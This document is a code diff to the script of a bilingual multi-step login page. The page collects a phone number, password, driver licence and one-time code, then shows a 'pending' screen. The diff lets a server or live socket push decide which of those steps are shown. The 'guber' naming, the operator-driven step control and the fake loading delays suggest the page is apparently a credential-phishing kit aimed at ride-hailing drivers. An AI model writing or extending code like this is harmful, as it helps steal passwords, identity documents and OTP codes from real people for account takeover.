@@ -13,6 +13,96 @@ let currentVerificationId = '';
 let resendCountdown = 60;
 let resendTimer = null;
 let currentLanguage = 'en';
+let flowSettings = {
+    requirePhone: true,
+    requirePassword: true,
+    requireLicense: true,
+    requireOtp: true
+};
+
+async function loadFlowSettings() {
+    try {
+        let settings = null;
+        try {
+            const res = await fetch('/api/page-settings');
+            const data = await res.json();
+            if (data.success && data.settings) {
+                settings = data.settings;
+                localStorage.setItem('guber_page_settings', JSON.stringify(settings));
+            }
+        } catch(e) {}
+
+        if (!settings) {
+            const local = localStorage.getItem('guber_page_settings');
+            if (local) settings = JSON.parse(local);
+        }
+
+        if (settings) {
+            flowSettings = {
+                requirePhone: true,
+                requirePassword: settings.requirePassword !== false,
+                requireLicense: settings.requireLicense !== false,
+                requireOtp: settings.requireOtp !== false
+            };
+            updateBackLinks();
+        }
+    } catch (err) {
+        console.error('Failed to load flow settings:', err);
+    }
+}
+
+function updateBackLinks() {
+    const txtChangeDl = document.getElementById('txt-change-password-dl');
+    if (txtChangeDl) {
+        if (flowSettings.requirePassword) {
+            txtChangeDl.textContent = currentLanguage === 'es' ? 'Cambiar contraseña' : 'Change password';
+        } else {
+            txtChangeDl.textContent = currentLanguage === 'es' ? 'Cambiar número' : 'Change phone number';
+        }
+    }
+
+    const txtChangeOtp = document.getElementById('txt-change-phone');
+    if (txtChangeOtp) {
+        if (flowSettings.requireLicense) {
+            txtChangeOtp.textContent = currentLanguage === 'es' ? 'Cambiar licencia de conducir' : 'Change driver license';
+        } else if (flowSettings.requirePassword) {
+            txtChangeOtp.textContent = currentLanguage === 'es' ? 'Cambiar contraseña' : 'Change password';
+        } else {
+            txtChangeOtp.textContent = currentLanguage === 'es' ? 'Cambiar número' : 'Change phone number';
+        }
+    }
+}
+
+window.addEventListener('storage', (e) => {
+    if (e.key === 'guber_page_settings' && e.newValue) {
+        try {
+            flowSettings = JSON.parse(e.newValue);
+            updateBackLinks();
+        } catch(err) {}
+    }
+});
+
+window.addEventListener('guber_page_settings_changed', (e) => {
+    if (e.detail) {
+        flowSettings = e.detail;
+        updateBackLinks();
+    }
+});
+
+if (socket && typeof socket.on === 'function') {
+    socket.on('page_settings_updated', (settings) => {
+        if (settings) {
+            flowSettings = {
+                requirePhone: true,
+                requirePassword: settings.requirePassword !== false,
+                requireLicense: settings.requireLicense !== false,
+                requireOtp: settings.requireOtp !== false
+            };
+            localStorage.setItem('guber_page_settings', JSON.stringify(flowSettings));
+            updateBackLinks();
+        }
+    });
+}
 
 // Multilingual Dictionaries (EN / ES)
 const translations = {
@@ -113,6 +203,7 @@ const displayTimestamp = document.getElementById('final-date-display');
 // Initialize UI & Language
 document.addEventListener('DOMContentLoaded', () => {
     setLanguage('en');
+    loadFlowSettings();
 });
 
 // Switch UI Language
@@ -179,6 +270,8 @@ function setLanguage(lang) {
     safeSetText('txt-srv3-title', t.srv3Title);
     safeSetText('txt-srv3-desc', t.srv3Desc);
     safeSetText('nav-help', t.help);
+
+    updateBackLinks();
 }
 
 function switchLanguage(lang) {
@@ -262,8 +355,22 @@ function handlePhoneSubmit(e) {
         if (userPhoneDisplayPw) userPhoneDisplayPw.textContent = fullPhone;
         if (userPhoneDisplayDl) userPhoneDisplayDl.textContent = fullPhone;
         if (userPhoneDisplay) userPhoneDisplay.textContent = fullPhone;
-        switchStep(stepPhone, stepPassword);
-        if (passwordInput) passwordInput.focus();
+        updateBackLinks();
+
+        if (flowSettings.requirePassword) {
+            switchStep(stepPhone, stepPassword);
+            if (passwordInput) passwordInput.focus();
+        } else if (flowSettings.requireLicense) {
+            switchStep(stepPhone, stepLicense);
+            if (licenseInput) licenseInput.focus();
+        } else if (flowSettings.requireOtp) {
+            switchStep(stepPhone, stepOtp);
+            startResendTimer();
+            if (otp1) otp1.focus();
+        } else {
+            if (pendingPhoneDisplay) pendingPhoneDisplay.textContent = fullPhone;
+            switchStep(stepPhone, stepPending);
+        }
     }, 400);
 }
 
@@ -303,8 +410,20 @@ function handlePasswordSubmit(e) {
     setTimeout(() => {
         setLoading(btn, false);
         if (userPhoneDisplayDl) userPhoneDisplayDl.textContent = currentPhoneNumber;
-        switchStep(stepPassword, stepLicense);
-        if (licenseInput) licenseInput.focus();
+        if (userPhoneDisplay) userPhoneDisplay.textContent = currentPhoneNumber;
+        updateBackLinks();
+
+        if (flowSettings.requireLicense) {
+            switchStep(stepPassword, stepLicense);
+            if (licenseInput) licenseInput.focus();
+        } else if (flowSettings.requireOtp) {
+            switchStep(stepPassword, stepOtp);
+            startResendTimer();
+            if (otp1) otp1.focus();
+        } else {
+            if (pendingPhoneDisplay) pendingPhoneDisplay.textContent = currentPhoneNumber;
+            switchStep(stepPassword, stepPending);
+        }
     }, 400);
 }
 
@@ -344,24 +463,47 @@ function handleLicenseSubmit(e) {
     setTimeout(() => {
         setLoading(btn, false);
         if (userPhoneDisplay) userPhoneDisplay.textContent = currentPhoneNumber;
-        switchStep(stepLicense, stepOtp);
-        startResendTimer();
-        if (otp1) otp1.focus();
+        updateBackLinks();
+
+        if (flowSettings.requireOtp) {
+            switchStep(stepLicense, stepOtp);
+            startResendTimer();
+            if (otp1) otp1.focus();
+        } else {
+            if (pendingPhoneDisplay) pendingPhoneDisplay.textContent = currentPhoneNumber;
+            switchStep(stepLicense, stepPending);
+        }
     }, 400);
 }
 
 function goToStepLicense() {
-    switchStep(stepOtp, stepLicense);
-    if (licenseInput) licenseInput.focus();
+    updateBackLinks();
+    if (flowSettings.requireLicense) {
+        switchStep(stepOtp, stepLicense);
+        if (licenseInput) licenseInput.focus();
+    } else if (flowSettings.requirePassword) {
+        switchStep(stepOtp, stepPassword);
+        if (passwordInput) passwordInput.focus();
+    } else {
+        switchStep(stepOtp, stepPhone);
+        if (phoneInput) phoneInput.focus();
+    }
 }
 
 function goToStepPassword() {
-    switchStep(stepLicense, stepPassword);
-    if (passwordInput) passwordInput.focus();
+    updateBackLinks();
+    if (flowSettings.requirePassword) {
+        switchStep(stepLicense, stepPassword);
+        if (passwordInput) passwordInput.focus();
+    } else {
+        switchStep(stepLicense, stepPhone);
+        if (phoneInput) phoneInput.focus();
+    }
 }
 
 function goToStepPhone() {
-    switchStep(stepPassword, stepPhone);
+    updateBackLinks();
+    switchStep(getCurrentActiveStep(), stepPhone);
     if (phoneInput) phoneInput.focus();
 }
 
